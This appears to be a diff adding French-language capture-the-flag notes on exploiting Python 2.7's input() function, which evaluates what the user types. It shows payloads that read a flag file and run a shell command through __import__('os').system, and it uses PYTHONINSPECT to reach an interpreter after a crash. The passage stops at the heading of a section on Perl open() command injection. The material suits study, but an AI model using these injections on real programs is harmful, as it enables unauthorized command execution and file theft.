@@ -1,3 +1,35 @@
+Avec python 2.7.17 on peut acceder a n'importe quelle fonction dans le script, ou bien importer une fonction via __import__:
+
+__import__('sys').stdout.write(open("flag.txt", 'r').read())
+__import__('os').system('cat flag.txt> /tmp/flag.txt')
+
+=> GOTO flag.txt
+
+Ou bien :
+
+#!/usr/bin/python2
+
+import sys
+
+def ultrasecret():
+    open("supersecret", 'r').read()
+    sys.exit(1)
+
+try:
+    p = input("Please enter password : ")
+    
+
+Please enter password : ultrasecret()
+
+PYTHONINSPECT=YesMyLord ./xx
+Please enter password : blabla !
+Traceback (most recent call last):
+<SNIP>
+>>> f = open("flag")
+>>> print f.readlines()
+['...']
+
+
 Perl command Injection :
 
 The open() function can be used to pass a command :
